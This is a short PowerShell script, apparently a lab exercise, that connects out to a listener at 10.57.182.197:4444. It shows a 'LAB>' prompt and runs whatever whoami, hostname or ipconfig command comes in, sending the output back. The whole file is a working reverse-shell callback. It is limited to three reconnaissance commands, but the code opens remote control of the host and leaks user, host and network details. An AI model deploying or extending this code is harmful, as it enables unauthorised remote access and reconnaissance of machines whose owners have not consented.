$client = New-Object System.Net.Sockets.TcpClient("10.57.182.197",4444)
$stream = $client.GetStream()

$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($true) {
    $writer.Write("LAB> ")

    $command = $reader.ReadLine()

    if ($command -eq "exit") {
        break
    }

    switch ($command) {
        "whoami" {
            $output = whoami
        }

        "hostname" {
            $output = hostname
        }

        "ipconfig" {
            $output = ipconfig | Out-String
        }

        default {
            $output = "Command not allowed."
        }
    }

    $writer.WriteLine($output)
}

$reader.Close()
$writer.Close()
$client.Close()
